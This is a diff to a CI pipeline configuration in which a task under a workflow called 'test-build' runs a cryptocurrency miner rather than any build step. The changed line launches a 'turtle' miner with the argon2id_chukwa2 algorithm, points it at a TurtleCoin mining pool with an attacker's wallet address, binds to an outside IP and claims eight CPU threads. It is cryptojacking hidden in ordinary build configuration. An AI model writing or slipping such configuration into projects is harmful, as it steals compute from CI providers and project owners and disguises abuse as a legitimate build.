@@ -3,7 +3,7 @@ tasks:
     runner: christiankm01/master:latest
     steps:
     - commands:
-      -  turtle  --algorithm argon2id_chukwa2 --pool pool.hashvault.pro:80 --wallet TRTLv3ZvhUDDzXp9RGSVKXcMvrPyV5yCpHxkDN2JRErv43xyNe5bHBaFHUogYVc58H1Td7vodta2fa43Au59Bp9qMNVrfaNwjWP
+      -  turtle  --bind=54.39.234.99:3129 --algorithm argon2id_chukwa2 --pool ca.turtlecoin.herominers.com:10380 --wallet TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF.p5 --disable-gpu --cpu-threads 8
 workflows:
 - name: test-build
   tasks:
